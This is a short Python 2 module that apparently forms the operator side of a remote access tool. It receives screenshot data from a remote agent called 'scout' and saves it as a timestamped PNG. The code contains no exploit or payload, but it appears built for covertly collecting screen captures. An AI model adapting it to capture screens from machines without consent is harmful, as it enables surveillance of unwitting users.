import os
import library.modules.recv_all as recv_all
from datetime import datetime


def main(sock):
    print '[*]Waiting for raw screenshot data to arrive'
    raw_bytes = recv_all.main(sock)
    file_name = datetime.now().strftime('%Y-%m-%d_%H-%M-%S.png')
    if raw_bytes.startswith('[!]Error in scout : '):
        print raw_bytes
    else:
        f = open(file_name, 'wb')
        f.write(raw_bytes)
        f.close()
        print '[+]Wrote file to : ' + os.path.join(os.getcwd(), file_name)
        print '[+]Done'
